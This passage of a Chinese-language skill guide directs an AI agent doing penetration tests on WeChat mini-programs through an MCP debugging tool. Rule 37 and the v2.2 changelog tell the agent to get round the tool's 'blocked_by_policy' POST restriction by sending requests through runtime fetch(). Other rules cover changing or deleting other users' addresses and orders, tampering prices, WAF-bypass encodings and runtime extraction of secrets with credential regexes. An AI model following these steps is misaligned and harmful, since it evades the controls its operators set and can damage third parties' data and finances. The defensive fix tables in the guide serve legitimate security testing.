37. **replay_ops 被阻断时换 fetch**：`replay_ops` 对 POST 默认阻断（`blocked_by_policy`），用 `runtime_ops(action="runtime_eval")` 中的 `fetch()` 直接从 webview 层发请求，绕过限制且能拿到完整响应
38. **IDOR 判据是数据差异，不是状态码**：BASELINE 有用户数据、IDOR_* 返回了不同的 `phone/name/idCard` → IDOR 确认。BASELINE 和 IDOR_* 都返回空 `data:[]` → 无法判断（需要换有数据填充的接口重测）
39. **路径中的 `/undefined` 是高价值 IDOR 入口**：`/api/detail/undefined` 是 JS 变量未初始化时拼接路径的产物，服务端可能按路径参数直接查数据库。将 `undefined` 替换为数字 1/2/3 枚举资源——不要跳过，这类接口往往缺少鉴权（因为客户端根本没传入真实 ID，意味着权限绑定逻辑也可能未覆盖这条路径）

### 运行时与上下文（40-43）
40. **`wx is not defined` / `getCurrentPages is not defined` → 上下文错误，立即修复**：`runtime_eval` 默认运行在 page-frame 上下文，`wx`/`getCurrentPages`/`__wxConfig` 只存在于 appservice。遇到这类 ReferenceError 时，先调用 `connection_ops(action="select_appservice_context")` 切换上下文再重试，不要反复猜测表达式写法
41. **`search_in_sources` 全返回 0 → cachedata 脚本，改用运行时扫描**：微信 PC 端小程序脚本常以 `.cachedata` 二进制格式缓存，静态文本搜索完全失效。此时用 `runtime_eval` 遍历 `globalThis` 函数名 + `wx.getStorageSync` 密钥 + 全局变量扫描代替，效果等同甚至更好（能直接拿到运行时的明文值）
42. **JWT/Token 出现在 URL 中是独立 MEDIUM 发现**：即使该接口无 IDOR，token 在 URL 中意味着它会被记录在 Nginx access log / CDN 日志 / 浏览器历史 / Referer 头，应单独列为信息泄露漏洞（不要与 IDOR 合并成一条）
43. **多 appId = 同一评估目标，按认证系而非 appId 分类**：同一 WeChat 会话中出现的多个 appId 均属于同一产品线（同一开发者），无需分开评估。正确做法是：识别所有 appId → 确认后端域名重叠（同一产品）→ 按认证机制（Bearer JWT / Token+Sign / Cookie / enc参数）建立统一接口清单 → 在当前 session 内一次性完成所有接口的 Phase 2 测试

### 上传点与路由报告（54-56）
54. **Detail 路由不带 ID 测试等于没测**：直接导航 `*Detail*` 路由通常返回空数据或 404，必须先从同模块 list 接口响应中提取真实 ID 再导航，并立即对该接口执行 IDOR 测试（不同 userId/itemId 对比响应差异）。没有 ID 的 Detail 测试结果不可信。
56. **每条漏洞报告必须包含「来源路由」**：报告中每个漏洞必须注明触发该漏洞的小程序路由路径（如 `pages-sub/borrow/my-order/detail`），而不只是接口 URL。路由是漏洞复现的入口，也是确认攻击面的关键依据。路由还需检查是否同时存在文件上传功能（如个人信息页同时有头像上传 + 个人信息 IDOR）。
50. **敏感信息不只靠正则，运行时变量是盲区**：`search_in_sources` 扫不到 `getApp().globalData` 里的 AK/SK，也扫不到 Webpack 模块缓存（`__webpack_require__.c`）中导出的 config 对象，更扫不到 Storage 里 key 名无害但值含密钥的条目。评估开始时就应并行执行 Phase 4.7.0 全套运行时提取（getApp 递归展开 / webpack 模块遍历 / require 枚举 config 路径 / Storage 全量扫描 / 页面 data 检查），与 4.7.1-4.7.9 正则扫描互补，两路任何一路命中均算有效。
52. **地址越权不能只靠 IDOR 候选扫描，必须自己添加地址拿 ID**：`find_idor_candidates` 只能发现流量中已经出现的地址接口。地址编辑/删除场景在未操作时不产生流量。正确做法是：① 主动调用 address/add 提交测试地址获取 addressId；② 用该 ID 作为基准枚举前后各 10 个 ID；③ 尝试 GET/PUT/DELETE 操作他人地址。写越权（修改/删除他人地址）比读越权危害高两个等级，优先测试。
53. **订单越权不支付也能测，待支付状态的 orderId 即有效**：无需真正支付。提交订单后状态为"待支付"，此时 orderId 已存在可用于越权测试。用自己的 orderId 枚举相邻值，测试 GET 订单详情/POST 取消/POST 确认收货。特别注意：① 取消他人订单（可致商家损失）；② 确认他人收货（伪造签收，可使商家提前结算）；③ 客户端传价格参数 → 价格篡改为 0.01；④ 优惠券 couponId 枚举 → 免费使用他人券。所有资金类操作遵守红线：build_replay_plan 只生成计划不自动发送。
### HTTP 响应码行为检测（44-48）
44. **404 on login = OAuth2 迁移信号，不等于已安全**：传统登录端点返回 404 常意味着认证已切换 OAuth2/OIDC 而非安全问题消失。必须额外检查：① OAuth2 redirect_uri 是否严格白名单；② Storage 中的旧 token 是否仍有效（迁移不完整）；③ 旧 API 版本（/v1/ vs /v2/）是否同步迁移（版本差异是高频漏洞来源）
45. **WAF 418 = 商业 WAF 指纹，也是绕过的起点**：HTTP 418 被商业 WAF（Cloudflare/安全狗/宝塔/云锁）借用为阻断标记。收到 418 时：先读响应头/Body 确认 WAF 厂商 → 再针对该厂商的规则盲区选择绕过策略（双重 URL 编码 `%252e` / chunked 传输 / 路径参数注入 `/api;foo=bar/../`）。注意 WAF 也可能统一返回 404 掩盖真实响应，不能仅凭 404 排除路径穿越漏洞
47. **REST 路由 200 + 陌生数据 = 立即转 IDOR 测试**：带路由参数的端点返回 200 且响应体包含他人数据字段（phone/name/idCard/orderId）时，无论认证机制如何，这都是 IDOR 确认信号。行为变化（新端点存活、新方法允许）比静态分析结果更可靠——优先检测 DELETE/PUT 方法，写越权比读越权危害高一个等级
48. **HTTP 方法枚举是 IDOR 的乘数器**：发现 GET `/api/users/1` → 200 之后，立即枚举 DELETE / PUT / PATCH。DELETE 200 = 越权删除（高危，立即停止并记录证据）；PUT 200 = 越权修改；OPTIONS 返回 Allow 头 = 直接读取服务端允许方法列表。同时检查不同 API 版本（v1/v2/v3）对同一资源的方法权限差异——旧版本常未同步修复

---

## 解密算法支持速查表

| 算法 | MCP 参数 | 备注 |
|------|----------|------|
| AES-CBC | `algorithm="aes", mode="cbc"` | iv 未提供时从密文前 16 字节提取 |
| AES-ECB | `algorithm="aes", mode="ecb"` | 无 IV，相同明文块产生相同密文块 |
| 3DES-ECB | `algorithm="3des", mode="ecb"` | key < 24 字节自动零填充 |
| 3DES-CBC | `algorithm="3des", mode="cbc"` | 需提供 iv |
| RSA-PKCS1v15 | `algorithm="rsa"` | key 为 PEM 格式私钥 |
| MD5 Hash | `algorithm="md5"` | 结果为 hex |
| SHA-256 | `algorithm="sha256"` | 结果为 hex |
| HMAC-SHA256 | `algorithm="hmac-sha256"` | 需 key |
| MD5 Key Derive | `algorithm="md5-key-derive"` | 用于流水线，key 为 salt |
| ECB Pattern Detect | `action="detect_ecb_pattern"` | 检测密文是否有重复块 |

---

## 逆向代码保护速查表

| 保护类型 | 识别特征 | 策略 |
|----------|----------|------|
| Webpack 打包 | `webpackJsonp` / `__webpack_require__` | 建立 moduleId 映射 → 定位加密模块 → 提取 |
| OB 混淆 | `_0x` 前缀变量 + 十六进制字符串数组 | 提取字符串数组 → 还原引用 → 变量重命名 |
| JSVMP | `while(true){switch(...)}` + 200KB+ 文件 | 不反编译 → Hook 出入口截取签名值 |
| eval/Function 打包 | `eval(...)` 或 `new Function(...)` 包裹 | Hook eval/Function 拦截解包后的源码 |
| 控制流平坦化 | switch-case 状态机 + 无限循环 | 追踪状态转移 → 还原执行顺序 |
| 反调试 | `setInterval(()=>{debugger})` / console 检测 | 用 `get_console_logs` 替代 console / Hook 层面绕过 |

---

## 敏感信息检测速查表

### 凭据类型与搜索模式

| 危害 | 类型 | 搜索关键词 | 命中示例 |
|------|------|-----------|---------|
| 🔴 | 腾讯云 AK/SK | `AKID[A-Za-z0-9]{32,48}` / `TENCENT_SECRET` | AKIDa1b2... (32-48位) |
| 🔴 | 阿里云 AK/SK | `LTAI[A-Za-z0-9]{16,24}` / `ALIBABA_CLOUD` | LTAI5t... (16-24位) |
| 🔴 | AWS AK/SK | `AKIA[A-Z0-9]{16}` / `AWS_ACCESS_KEY` | AKIA... (16位) |
| 🔴 | 微信 AppSecret | `appSecret.*['\"]\\w{32}['\"]` / `WX_APPSECRET` | AppSecret 32位 hex |
| 🔴 | 支付商户密钥 | `mch_key` / `partner_key` / `paySignKey` | 微信支付/支付宝密钥 |
| 🔴 | 数据库连接串 | `jdbc:` / `mongodb://` / `redis://` / `mysql://` | 含用户名密码的完整 URI |
| 🔴 | RSA 私钥 | `BEGIN.*PRIVATE KEY` | PEM 格式完整私钥 |
| 🟠 | JWT Secret | `jwt_secret` / `JWT_SECRET` / `tokenSecret` | 任意长度字符串 |
| 🟠 | AES/DES 密钥 | `aes_key` / `_aesKey` / `DES_KEY` | 硬编码加密密钥 |
| 🟠 | 签名密钥 | `sign_key` / `SIGN_SECRET` / `encrypt_key` | 用于签名的 secret |
| 🟡 | GitHub Token | `ghp_[A-Za-z0-9]{36}` / `github_pat_` | ghp_xxxx... (36位) |
| 🟡 | 钉钉/飞书 Webhook | `oapi\\.dingtalk\\.com/robot` / `open\\.feishu\\.cn` | 含 token 的完整 URL |
| 🟡 | 七牛/又拍云 | `qiniu` / `QINIU_SECRET` / `upyun` | 对象存储 AK/SK |
| 🟡 | 内网地址 | `10\\.` / `192\\.168\\.` / `dev\\.` / `staging\\.` | 内部 IP 或测试域名 |
| 🟡 | 手机号/邮箱 | `1[3-9]\\d{9}` / 邮箱正则 | 源码中硬编码的联系信息 |

### 扫描优先级

```
第一轮（CRITICAL，30 秒）:
  → AKID / LTAI / AKIA / appSecret / mch_key / jdbc: / mongodb:// / BEGIN.*PRIVATE KEY

第二轮（HIGH，30 秒）:
  → jwt_secret / aes_key / sign_key / encrypt_key / DES_KEY / cipher_key

第三轮（MEDIUM，20 秒）:
  → GitHub Token / Webhook URL / 七牛 / 内网 IP / 手机号 / 邮箱

第四轮（复核，按需）:
  → 对命中的行用 get_script_source 读取上下文，排除误报
```

---

## 漏洞报告模板

### 通用模板

```
漏洞类型：[IDOR / 认证绕过 / 未授权访问 / 敏感信息泄露 / 签名重放 / 支付风险]
OWASP 分类：[A01 越权 / A02 密码失败 / A07 认证失败 / A09 日志不足]
风险等级：🔴 严重 / 🟠 高危 / 🟡 中危 / 🟢 低危

发现位置：
  路由：[pages/xxx/xxx]
  接口：[HTTP Method] [完整 URL]
  参数：[参数名] = [原始值] → [测试值]

复现步骤：
  1. Phase 0 连接小程序，network_ops(action="hook_wx_request") 启用流量采集
  2. 导航至 [路由]，触发目标接口，获取正常响应（附截图/日志）
  3. 使用 runtime_eval(fetch) 修改 [参数/Token]，发送测试请求
  4. 响应返回 [他人数据 / 越权操作成功] → 漏洞确认（附对比截图）

影响范围：[描述可访问数据类型 / 可执行的操作]

修复建议：[针对该类型的具体建议]
```

---

### 各类型速查

| 漏洞类型 | 典型特征 | 修复方向 |
|---------|---------|---------|
| **IDOR** | 修改 id/orderId 获取他人数据 | 服务端校验资源归属，不信任客户端传入的用户 ID |
| **认证绕过** | 去掉 Token 仍返回 200+数据 | 所有接口加认证中间件，区分 401/403 |
| **垂直越权** | 普通 Token 访问管理员接口成功 | 接口级权限校验，不只前端隐藏 |
| **敏感信息泄露** | 源码含 AK/SK / AppSecret / 私钥 | 凭据上移服务端，前端只用临时 STS Token |
| **签名重放** | 同一 sign 多次使用均成功 | 时间窗口缩短（≤5min），nonce 一次性校验 |
| **支付风险** | 客户端 price 参数被服务端直接使用 | 服务端按 productId 重新查价，忽略客户端金额 |
| **JWT-in-URL** | token=eyJ... 出现在 URL query | 改用 Authorization 请求头传输 |

---

## 资源索引

| 资源 | 用途 | 获取方式 |
|-----|------|---------|
| WMPFDebugger | 小程序 CDP 调试入口 | 微信开发者工具内置 |
| miniapp_cdp MCP | 本 skill 依赖的 MCP 服务 | 项目内 `run_mcp_server.py` |
| CyberChef | 在线多层编解码验证 | gchq.github.io/CyberChef |
| jwt.io | JWT 解码与调试 | jwt.io |
| mitmproxy | HTTPS 流量抓包 | mitmproxy.org |
| PayloadsAllTheThings | 越权 / 注入 Payload 参考 | github.com/swisskyrepo/PayloadsAllTheThings |
| HackerOne Reports | 真实小程序/API 漏洞案例 | github.com/reddelexc/hackerone-reports |
| OWASP Mobile Top 10 | 移动端安全参考标准 | owasp.org/www-project-mobile-top-10 |
| OWASP API Top 10 | API 安全参考标准 | owasp.org/www-project-api-security |

---

## 更新记录

| 版本 | 日期 | 要点 |
|------|------|------|
| v2.11 | 2026-05-25 | Phase 1.1 重写路由优先级分级 P0/P1/P2/P3，P0 采集完立即进 Phase 2；经验法则 #3 更新 |
| v2.10 | 2026-05-25 | Phase 0 重写：Step 3 改为注入 nav_inject.js；Phase 1.0 改用 fetchConfigJson()；Phase 1.1 导航改用 reLaunchJson；经验法则 #4 更新 |
| v2.9 | 2026-05-25 | Phase 1.1 新增"空流量路由决策树"（空流量→强制刷新→子页→标记跳过，最多重试 2 次）；静态路由标注格式示例；经验法则 #4 更新 TabBar 切换说明；新增经验法则 #7（空流量路由最多重试 2 次即跳过）|
| v2.7 | 2026-05-25 | Phase 2.8 新增 HTTP 响应码行为变化检测（登录 404→OAuth2迁移 / 上传端点存活检测 / 路径遍历CVE探针 + WAF 418指纹 / REST路由参数枚举行为变化）；场景 16-19 新增；最小可行扫描加入 Phase 2.8；经验法则 44-48 新增（HTTP行为检测）|
| v2.6 | 2026-05-24 | 多 appId 语义修正：同一会话多 appId = 同一评估目标（按认证系分类而非按 appId 分桶）；CHECK-2 速查表新增 enc 参数型 + Authen-Sign 型；CHECK-4 新增多 appId 声明项；最小可行扫描路径更新至 2.2.1 + 2.5.1；Phase 2.5.1 ⑤ 重写 + ⑥ 新增 Authen-Sign 分析；场景 15 重写；经验法则 #43 更新 |
| v2.5 | 2026-05-24 | Phase 0 修正步骤顺序（select_appservice_context 移至第 3 步）；Phase 1.0 新增上下文故障恢复指引；Phase 1.4 新增 cachedata 脚本降级方案；Phase 2.1 新增 500 歧义判断；Phase 2.5.1 新增 5 类专项风险检测（JWT-in-URL / 静态 sign / 双斜杠路径 / enc 绑定模式 / 多 appId）；场景 13-15 新增；经验法则 40-43 新增（上下文错误 / cachedata / JWT-in-URL / 多 appId）|
| v2.4 | 2026-05-24 | Phase 2.2.1 新增路径参数 undefined IDOR 检测与枚举测试模板；场景 12 新增 undefined 路径枚举流程；经验法则 #39 新增 |
| v2.3 | 2026-05-23 | 新增评估流程总览表 + 最小可行扫描提示；修复经验法则 #37 工具名拼写（`runtime_eval` → `runtime_ops`）|
| v2.2 | 2026-05-23 | Phase 2.1/2.2 主动测试改造：认证绕过和 IDOR 用 `runtime_eval`+`fetch` 自动发送请求、绕过 `replay_ops` POST 阻断；IDOR 判据从"看静态分析报告"改为"对比数据差异"；Phase 4.7.2 新增 Gateway 配置结构检测（`accessKey\s*[:"]` 精确匹配 + `gateway.*accessKey`）+ 搜索后 4 步验证流程；经验法则 32-33 更新（AK 格式不够 + 二次验证）、新增 36-38（主动测试）|
| v2.1 | 2026-05-23 | Phase 4.7 源码敏感信息检测：11 类凭据扫描 + 11项执行清单 + 报告模板 + 5 条经验法则 + 检测速查表 |
| v2.0 | 2026-05-23 | 路由标注机制 + 全路由遍历测试 + Phase 4 逆向分析 + 密码学攻击检测 + 经验法则 20→30 条 |
| v1.0 | 2026-05-23 | 初版：渗透 Phase 0-5 + 解密多层流水线 + Vuex 检查 + 20 条经验法则 |
